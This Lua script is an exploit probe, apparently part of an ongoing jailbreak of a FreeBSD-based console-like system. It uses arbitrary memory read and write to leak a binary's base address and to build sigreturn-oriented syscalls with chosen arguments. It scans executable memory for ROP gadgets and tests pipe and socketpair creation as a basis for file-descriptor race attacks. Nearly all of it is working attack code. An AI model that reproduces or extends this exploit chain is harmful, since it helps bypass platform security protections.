-- CRASH_CLASS: LOW
-- PROBE 142n: Extended gadget search + pipe/socketpair via SROP
--
-- 142m confirmed: threads work, side effects work, multi-threading works.
-- Need: pop_rdx;ret for full 6-arg syscall control from child threads.
-- Also need: write-to-memory gadget for thread-based memory modification.
-- And: test pipe(42) and socketpair(135) via SROP for fd race attacks.

print("=== PROBE 142n: GADGETS+PIPE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_nanosleep = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- SROP helper
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. hex(eboot))

-- Get text segment size
local text_size_lo = safe_rd(info + 0x110) or 0
local text_size_hi = safe_rd(info + 0x114) or 0
print("text_size=0x" .. string.format("%X%08X", text_size_hi, text_size_lo))

--------------------------------------------------------------------
-- [A] Extended gadget search: scan 2MB-8MB of eboot for:
-- pop rdx; ret (5A C3)
-- pop r10; ret (41 5A C3)
-- mov [rdi], rax; ret (48 89 07 C3) — write gadget
-- mov [rdi], esi; ret (89 37 C3) — write gadget
-- Also check 0-2MB again for pop rdx specifically (byte-aligned)
--------------------------------------------------------------------
print("")
print("--- [A] Extended gadget search ---")

local gadgets = {}
local scan_end = 0x800000  -- 8MB
local progress_step = 0x100000  -- 1MB

-- Fast dword-based scan
for off = 0, scan_end - 4, 4 do
    local d = safe_rd(eboot + off)
    if not d then
        print("[A] read fail at +0x" .. string.format("%X", off))
        break
    end

    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256

    -- pop rdx; ret (5A C3) at byte 0
    if b0 == 0x5A and b1 == 0xC3 and not gadgets.pop_rdx then
        gadgets.pop_rdx = off
        print("[A] pop_rdx;ret: eboot+0x" .. string.format("%X", off))
    end
    -- at byte 1
    if b1 == 0x5A and b2 == 0xC3 and not gadgets.pop_rdx then
        gadgets.pop_rdx = off + 1
        print("[A] pop_rdx;ret: eboot+0x" .. string.format("%X", off + 1))
    end
    -- at byte 2
    if b2 == 0x5A and b3 == 0xC3 and not gadgets.pop_rdx then
        gadgets.pop_rdx = off + 2
        print("[A] pop_rdx;ret: eboot+0x" .. string.format("%X", off + 2))
    end

    -- pop r10; ret (41 5A C3) — 3 bytes
    if b0 == 0x41 and b1 == 0x5A and b2 == 0xC3 and not gadgets.pop_r10 then
        gadgets.pop_r10 = off
        print("[A] pop_r10;ret: eboot+0x" .. string.format("%X", off))
    end
    if b1 == 0x41 and b2 == 0x5A and b3 == 0xC3 and not gadgets.pop_r10 then
        gadgets.pop_r10 = off + 1
        print("[A] pop_r10;ret: eboot+0x" .. string.format("%X", off + 1))
    end

    -- mov [rdi], rax; ret (48 89 07 C3) — write qword
    if b0 == 0x48 and b1 == 0x89 and b2 == 0x07 and b3 == 0xC3 and not gadgets.write_qword then
        gadgets.write_qword = off
        print("[A] mov[rdi],rax;ret: eboot+0x" .. string.format("%X", off))
    end
    -- mov [rdi], esi; ret (89 37 C3) — write dword
    if b0 == 0x89 and b1 == 0x37 and b2 == 0xC3 and not gadgets.write_dword then
        gadgets.write_dword = off
        print("[A] mov[rdi],esi;ret: eboot+0x" .. string.format("%X", off))
    end
    -- mov [rdi], eax; ret (89 07 C3) — write dword
    if b0 == 0x89 and b1 == 0x07 and b2 == 0xC3 and not gadgets.write_eax then
        gadgets.write_eax = off
        print("[A] mov[rdi],eax;ret: eboot+0x" .. string.format("%X", off))
    end

    -- syscall; ret (0F 05 C3)
    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 and not gadgets.syscall_ret then
        gadgets.syscall_ret = off
        print("[A] syscall;ret: eboot+0x" .. string.format("%X", off))
    end
    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 and not gadgets.syscall_ret then
        gadgets.syscall_ret = off + 1
        print("[A] syscall;ret: eboot+0x" .. string.format("%X", off + 1))
    end

    -- pop rcx; ret (59 C3) — useful for loops
    if b0 == 0x59 and b1 == 0xC3 and not gadgets.pop_rcx then
        gadgets.pop_rcx = off
        print("[A] pop_rcx;ret: eboot+0x" .. string.format("%X", off))
    end
    if b1 == 0x59 and b2 == 0xC3 and not gadgets.pop_rcx then
        gadgets.pop_rcx = off + 1
        print("[A] pop_rcx;ret: eboot+0x" .. string.format("%X", off + 1))
    end

    -- pop r8; ret (41 58 C3) — arg5
    if b0 == 0x41 and b1 == 0x58 and b2 == 0xC3 and not gadgets.pop_r8 then
        gadgets.pop_r8 = off
        print("[A] pop_r8;ret: eboot+0x" .. string.format("%X", off))
    end
    if b1 == 0x41 and b2 == 0x58 and b3 == 0xC3 and not gadgets.pop_r8 then
        gadgets.pop_r8 = off + 1
        print("[A] pop_r8;ret: eboot+0x" .. string.format("%X", off + 1))
    end

    -- pop r9; ret (41 59 C3) — arg6
    if b0 == 0x41 and b1 == 0x59 and b2 == 0xC3 and not gadgets.pop_r9 then
        gadgets.pop_r9 = off
        print("[A] pop_r9;ret: eboot+0x" .. string.format("%X", off))
    end
    if b1 == 0x41 and b2 == 0x59 and b3 == 0xC3 and not gadgets.pop_r9 then
        gadgets.pop_r9 = off + 1
        print("[A] pop_r9;ret: eboot+0x" .. string.format("%X", off + 1))
    end

    if off > 0 and off % progress_step == 0 then
        print("[A] scanned " .. string.format("0x%X", off))
    end
end

print("[A] Scan complete. Found gadgets:")
for name, off in pairs(gadgets) do
    print("[A]  " .. name .. " = eboot+0x" .. string.format("%X", off))
end

--------------------------------------------------------------------
-- [B] pipe(42) via SROP — needs RDI = pointer to int[2]
--------------------------------------------------------------------
print("")
print("--- [B] pipe via SROP ---")

local pipe_fds = gpu + 0x1000
wd(pipe_fds, 0xDEAD)
wd(pipe_fds + 4, 0xDEAD)

local rv_pipe = srop(42, ua(pipe_fds))
local pvh, pvl = get_hi_lo(rv_pipe)
local fd0 = safe_rd(pipe_fds)
local fd1 = safe_rd(pipe_fds + 4)
print("[B] pipe ret=" .. hex(rv_pipe) .. " fd0=" .. (fd0 or "nil") .. " fd1=" .. (fd1 or "nil"))

if pvl == 0 and pvh == 0 then
    print("[B] *** PIPE WORKS VIA SROP! ***")
    if fd0 and fd0 ~= 0xDEAD and fd1 and fd1 ~= 0xDEAD then
        print("[B] *** GOT REAL FDs: " .. fd0 .. ", " .. fd1 .. " ***")
    end
end

--------------------------------------------------------------------
-- [C] socketpair(135) via SROP
-- socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, sv[2])
--------------------------------------------------------------------
print("")
print("--- [C] socketpair via SROP ---")

local sp_fds = gpu + 0x1010
wd(sp_fds, 0xDEAD)
wd(sp_fds + 4, 0xDEAD)

local rv_sp = srop(135, uint64(1), uint64(1), uint64(0), ua(sp_fds))
local svh, svl = get_hi_lo(rv_sp)
local sfd0 = safe_rd(sp_fds)
local sfd1 = safe_rd(sp_fds + 4)
print("[C] socketpair ret=" .. hex(rv_sp) .. " fd0=" .. (sfd0 or "nil") .. " fd1=" .. (sfd1 or "nil"))

if svl == 0 and svh == 0 then
    print("[C] *** SOCKETPAIR WORKS! ***")
end

--------------------------------------------------------------------
-- [D] pipe2(542) via SROP (FreeBSD pipe2)
--------------------------------------------------------------------
print("")
print("--- [D] pipe2 via SROP ---")

local p2_fds = gpu + 0x1020
wd(p2_fds, 0xDEAD)
wd(p2_fds + 4, 0xDEAD)

local rv_p2 = srop(542, ua(p2_fds), uint64(0))
local p2h, p2l = get_hi_lo(rv_p2)
local p2fd0 = safe_rd(p2_fds)
local p2fd1 = safe_rd(p2_fds + 4)
print("[D] pipe2 ret=" .. hex(rv_p2) .. " fd0=" .. (p2fd0 or "nil") .. " fd1=" .. (p2fd1 or "nil"))

if p2l == 0 and p2h == 0 then
    print("[D] *** PIPE2 WORKS! ***")
end

--------------------------------------------------------------------
-- [E] Test write(4) and read(3) on pipe if we got fds
--------------------------------------------------------------------
if fd0 and fd0 ~= 0xDEAD and fd1 and fd1 ~= 0xDEAD then
    print("")
    print("--- [E] pipe read/write ---")

    -- Write "HELLO" to fd1 (write end)
    local wbuf = gpu + 0x2000
    wd(wbuf, 0x4C4C4548)  -- "HELL"
    wd(wbuf + 4, 0x0000004F) -- "O\0"

    local rv_w = srop(4, uint64(fd1), ua(wbuf), uint64(5))
    print("[E] write ret=" .. hex(rv_w))

    -- Read from fd0 (read end)
    local rbuf = gpu + 0x3000
    wd(rbuf, 0)
    wd(rbuf + 4, 0)

    local rv_r = srop(3, uint64(fd0), ua(rbuf), uint64(5))
    print("[E] read ret=" .. hex(rv_r))

    local r0 = safe_rd(rbuf)
    local r1 = safe_rd(rbuf + 4)
    print("[E] read_data: 0x" .. string.format("%08X %08X", r0 or 0, r1 or 0))
    if r0 == 0x4C4C4548 then
        print("[E] *** PIPE I/O WORKS! READ 'HELL' ***")
    end
end

print("")
print("=== DONE ===")
